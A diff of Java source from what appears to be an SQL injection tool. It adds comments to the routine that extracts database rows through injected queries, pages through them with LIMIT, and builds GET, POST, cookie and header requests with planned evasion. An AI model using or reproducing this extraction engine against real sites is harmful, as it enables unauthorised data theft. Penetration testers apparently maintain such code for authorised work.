@@ -916,6 +916,11 @@ firstSuccessPageSource,
 
 			String sqlQuery = new String(initialSQLQuery).replaceAll("\\{limit\\}","");
 			
+			/**
+			 * We know the number of rows expected (numberToFind) and stop injection if all rows are found, 
+			 * we keep track of rows we have reached (limitSQLResult) and use these to skip entire rows,
+			 * we keep track of characters we have reached (startPosition) and use these to skip characters,
+			 */
 			String finalResultSource = "", currentResultSource = "";
 			for(int limitSQLResult=0, startPosition=1, i=1;/* 3 */;startPosition = currentResultSource.length()+1, i++){
 				
@@ -986,18 +991,30 @@ firstSuccessPageSource,
 				}
 				
 //				model.sendMessage("Packet "+i+".\n"+currentResultSource);
-	
+
+				// Parse all the data we have retrieved
 				Matcher regexSearch = Pattern.compile("SQLi([0-9A-Fghij]+)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(sourcePage[0]);
 				
+				/**
+				 * Ending condition:
+				 * One row could be very long, longer than the database can provide
+				 * #Need verification
+				 */
 				if(!regexSearch.find()){
 					if( useLimit && !finalResultSource.equals("") ){
 //						model.sendMessage("A");
-						if(numberToFind>0 && searchName != null) // nécessaire
+						// Update the view only if there are value to find, and if not the root (empty tree)
+						if(numberToFind>0 && searchName != null)
 							new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).run();
 						break;
 					}
 				}
 				
+				/**
+				 * Add the result to the data already found
+				 * Informs the view about it
+				 * If throws exception, inform the view about the failure
+				 */
 				try{
 					currentResultSource += regexSearch.group(1);
 					new GUIThread("logs-message",regexSearch.group(1)+" ").run();
@@ -1008,12 +1025,18 @@ firstSuccessPageSource,
 					throw new PreparationException("Fetching fails: no data to parse for "+searchName);
 				}
 				
+				/**
+				 * Check how many rows we have collected from the beginning of that chunk
+				 */
 				regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
 				int nbResult=0;
 				while(regexSearch.find()){
 					nbResult++;
 				}
 				
+				/**
+				 * Inform the view about the progression
+				 */
 				if( useLimit ){
 					if(numberToFind>0 && searchName != null)
 						new GUIThread("update-progressbar", new Object[]{searchName,limitSQLResult + nbResult}).run();
@@ -1021,22 +1044,46 @@ firstSuccessPageSource,
 //					System.out.println("Request " + i + ", data collected "+(limitSQLResult + nbResult) + (numberToFind>0?"/"+numberToFind:"") + " << " + currentResultSource.length() + " bytes" );
 				}
 	
-				/* Design Pattern: State */
+				/**
+				 * We have properly reached the i at the end of the query: iLQS
+				 * => hhxxxxxxxxjj00hhgghh...hiLQS
+				 */
+				/* Design Pattern: State? */
 				if(currentResultSource.contains("i")){
+					/**
+					 * Remove everything after our result
+					 * => hhxxxxxxxxjj00hhgghh...h |-> iLQSjunk
+					 */
 					finalResultSource += currentResultSource = Pattern.compile("i.*", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
 					if( useLimit ){
+						/**
+						 * Remove everything not properly attached to the last row:
+						 * 1. very start of a new row: XXXXXhhg[ghh]$
+						 * 2. very end of the last row: XXXXX[jj00]$
+						 */
 						finalResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
 						currentResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
 						
+						/**
+						 * Check either if there is more than 1 row and if there is less than 1 complete row
+						 */
 						regexSearch = Pattern.compile("[0-9A-F]hhgghh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
 						Matcher regexSearch2=Pattern.compile("h[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
 						
+						/**
+						 * If there is more than 1 row, delete the last incomplete one
+						 * else if there is 1 row but incomplete, mark it as cut with the letter c
+						 */
 						if(regexSearch.find()){
 							finalResultSource = Pattern.compile("hh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
 						}else if(regexSearch2.find()){
 							finalResultSource += "jj31chh";
 						}
 						
+						/**
+						 * Check how many rows we have collected from the very beginning of the query,
+						 * then skip every rows we have already found via LIMIT
+						 */
 						regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource);
 						
 						nbResult=0;
@@ -1045,10 +1092,15 @@ firstSuccessPageSource,
 						}
 						limitSQLResult = nbResult;
 						
+						// Inform the view about the progression 
 //						System.out.println("Request " + i + ", data collected " + limitSQLResult + (numberToFind>0 ? "/"+numberToFind : "" ));
 						if(numberToFind>0 && searchName != null)
 							new GUIThread("update-progressbar", new Object[]{searchName,limitSQLResult}).run();
 	
+						/**
+						 * Ending condition: every expected rows have been retrieved
+						 * Inform the view about the progression
+						 */
 						if( limitSQLResult == numberToFind ){ 
 //							model.sendMessage("B");
 							if(numberToFind>0 && searchName != null)
@@ -1056,15 +1108,24 @@ firstSuccessPageSource,
 							break; 
 						}
 						
+						/**
+						 *  Add the LIMIT statement to the next SQL query
+						 *  Put the character cursor to the beginning of the line, and reset the result of the current query 
+						 */
 	                    sqlQuery = Pattern.compile("\\{limit\\}", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(initialSQLQuery).replaceAll("+limit+" + limitSQLResult + ",65536");
 	                    startPosition=1;
 	                    currentResultSource="";
 					}else {
+						// Inform the view about the progression
 //						model.sendMessage("C");
 						if(numberToFind>0 && searchName != null)
 							new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).run();
 						break;
 					}
+				/**
+				 * Check if the line is odd or even, make it even
+				 * #Need verification
+				 */
 				}else if(currentResultSource.length() % 2 == 0){
 					currentResultSource = currentResultSource.substring(0, currentResultSource.length()-1);
 				}
@@ -1079,10 +1140,16 @@ firstSuccessPageSource,
 		return this.inject(dataInjection, null, false);
 	}
 
+	/**
+	 * Run a HTTP connection to the web server
+	 * @param dataInjection SQL query
+	 * @param responseHeader unused
+	 */
 	public String inject( String dataInjection, String[] responseHeader, boolean useVisibleIndex ){
 	    HttpURLConnection connection = null;
 		URL urlObject = null;
 
+		// Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2..." 
 		String urlUltimate = this.initialUrl;
 		dataInjection = dataInjection.replace("\\", "\\\\"); // escape crazy characters, like \ 
 		
@@ -1092,6 +1159,10 @@ firstSuccessPageSource,
 			this.sendErrorMessage(e.getMessage());
 		}
 		
+		/**
+		 * Build the GET query string infos
+		 * Add primary evasion
+		 */
 		if(this.getData != null && !this.getData.equals("")){
 			urlUltimate += this.buildQuery("GET", getData, useVisibleIndex, dataInjection);
 			try {
@@ -1125,6 +1196,7 @@ firstSuccessPageSource,
 			}
 		}
 		
+		// Define the connection
 		try {
 			connection = (HttpURLConnection) urlObject.openConnection();
 			connection.setReadTimeout(15000);
@@ -1133,13 +1205,22 @@ firstSuccessPageSource,
 			this.sendErrorMessage(e.getMessage());
 		}
 		
+		// Start the log informations
 		String logs = "\n";
 				
+		/**
+		 * Build the COOKIE and logs infos
+		 * #Need primary evasion
+		 */
 		if(!this.cookieData.equals("")){
 			connection.addRequestProperty("Cookie", this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection));
 			logs += "Cookie: " + this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection) + "\n";
 		}
 		
+		/**
+		 * Build the HEADER and logs infos
+		 * #Need primary evasion
+		 */
 		if(!this.headerData.equals("")){
 			for(String s: this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection).split(";")){
 				try {
@@ -1151,6 +1232,10 @@ firstSuccessPageSource,
 			logs += "Header: " + headerData + "\n";
 		}
 		
+		/**
+		 * Build the POST and logs infos
+		 * #Need primary evasion
+		 */
 		if(!this.postData.equals("")){
 			try {
 		        connection.setDoOutput(true);
@@ -1168,6 +1253,9 @@ firstSuccessPageSource,
 			}
 		}
 		
+		/**
+		 * Add informations and header response to the logs 
+		 */
 	    logs += urlUltimate+"\n";
 	    for (int i=0; ;i++) {
 	        String headerName = connection.getHeaderFieldKey(i);
@@ -1177,8 +1265,10 @@ firstSuccessPageSource,
 	        logs += (headerName==null?"":headerName+": ")+headerValue+"\n";
 	    }
 		
+	    // Inform the view about the log infos
 	    new GUIThread("add-header", logs).run();	
 	    
+	    // Request the web page to the server
 		String line, pageSource = "";
 		try {
 			BufferedReader reader = new BufferedReader(new InputStreamReader( connection.getInputStream() ));
@@ -1190,9 +1280,22 @@ firstSuccessPageSource,
 			this.sendErrorMessage(e.getMessage()); /* lot of timeout in local use */
 		}
 		
+		// return the web source code
 		return pageSource;
 	}
 	
+	/**
+	 * Build a correct data for GET, POST, COOKIE, HEADER
+	 * Each can be:
+	 *  - row data (no injection)
+	 *  - SQL query without index requirement
+	 *  - SQL query with index requirement
+	 * @param dataType Current method to build 
+	 * @param newData Beginning of the request data
+	 * @param useVisibleIndex False if request doesn't use indexes
+	 * @param urlPremiere SQL statement
+	 * @return Final data
+	 */
 	private String buildQuery( String dataType, String newData, boolean useVisibleIndex, String urlPremiere ){
 		if(!this.method.equals(dataType)){
 			return newData;
@@ -1203,6 +1306,7 @@ firstSuccessPageSource,
 		}
 	}
 	
+	// Inform the view about a console message
 	public void sendMessage(String message) {
 	    new GUIThread("console-message",message+"\n").run();
 	}
